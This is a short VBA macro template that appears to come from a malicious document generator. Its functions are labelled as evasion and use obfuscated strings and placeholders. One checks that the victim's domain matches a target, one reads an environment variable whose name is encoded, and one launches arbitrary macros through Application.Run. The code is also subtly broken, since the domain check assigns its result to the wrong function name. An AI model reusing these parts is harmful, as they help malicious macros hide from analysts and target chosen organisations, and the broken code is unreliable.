[use:func_evasion_domain]
[use:func_evasion_env]
[use:func_evasion_dom_wrapper]

Function func_evasion_domain(var7 As String) As String
    Dim var8 As String
    Dim var17 As String
    Dim var18 As String
    Dim int4 As Integer
    int4 = [int100]
    var17 = "func9"
    var18 = "[DOMAIN]"
    var17 = func1(var17, var18, int4)
    var8 = var17
    If (UCase(var7) = var8) Then
        func2 = "cond1"
    Else
        func2 = "cond2"
    End If
End Function

Function func_evasion_env(var9 As String) As String
    Dim var10 As String
	Dim var20 As String
	Dim int5 As Integer
	int5 = [INT5]
	var20 = "func4"
	var20 = func1(var20, "XVHUGRPDLQ", int5)
    var10 = Environ(var20)
	var20 = func5(var20)
    func_evasion_env = var10
End Function

Function func_evasion_dom_wrapper(var4 As String, var5 As String, var6 As Integer) As String
    If (var6 > 1) Then
        func_evasion_dom_wrapper = Application.Run(var4, var5)
    End If
End Function